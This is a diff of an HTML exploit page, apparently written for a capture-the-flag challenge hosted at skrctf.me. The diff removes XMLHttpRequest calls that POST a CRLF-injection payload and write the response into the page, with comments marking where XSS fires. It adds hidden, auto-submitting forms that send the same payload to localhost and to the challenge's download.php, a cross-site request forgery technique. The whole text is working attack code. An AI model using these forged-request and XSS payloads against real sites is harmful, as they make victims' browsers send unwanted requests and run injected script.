@@ -12,29 +12,22 @@
 
   xhr.send(data);
     </script>
-<script>
-  var xhr = new XMLHttpRequest();
-  xhr.open("POST", "http://localhost/download.php", true);
-  xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+    <!-- First form -->
+    <form id="form1" method="POST" action="http://localhost/download.php">
+      <textarea name="name" style="display:none;">&#13;&#10;</textarea>
+      <input type="hidden" name="id" value="1a2ee6d42f1b90c81db2ae0f66e094c7">
+    </form>
 
-  // Send raw POST body as-is
-  xhr.send("name=%0D%0A&id=1a2ee6d42f1b90c81db2ae0f66e094c7");
-    // Write response directly to DOM
-  document.open();
-  document.write(xhr.responseText); // ✅ XSS will fire here
-  document.close();
-</script>
-<script>
-  var xhr = new XMLHttpRequest();
-  xhr.open("POST", "https://skrctf.me/ports/941b1a088b7bffcb179360d0444976c0/download.php", true);
-  xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+    <!-- Second form -->
+    <form id="form2" method="POST" action="https://skrctf.me/ports/941b1a088b7bffcb179360d0444976c0/download.php">
+      <textarea name="name" style="display:none;">&#13;&#10;</textarea>
+      <input type="hidden" name="id" value="1a2ee6d42f1b90c81db2ae0f66e094c7">
+    </form>
 
-  // Send raw POST body as-is
-  xhr.send("name=%0D%0A&id=1a2ee6d42f1b90c81db2ae0f66e094c7");
-    // Write response directly to DOM
-  document.open();
-  document.write(xhr.responseText); // ✅ XSS will fire here
-  document.close();
-</script>
+    <script>
+      // Submit the first form
+      document.getElementById("form1").submit();
+      document.getElementById("form2").submit();
+    </script>
   </body>
 </html>
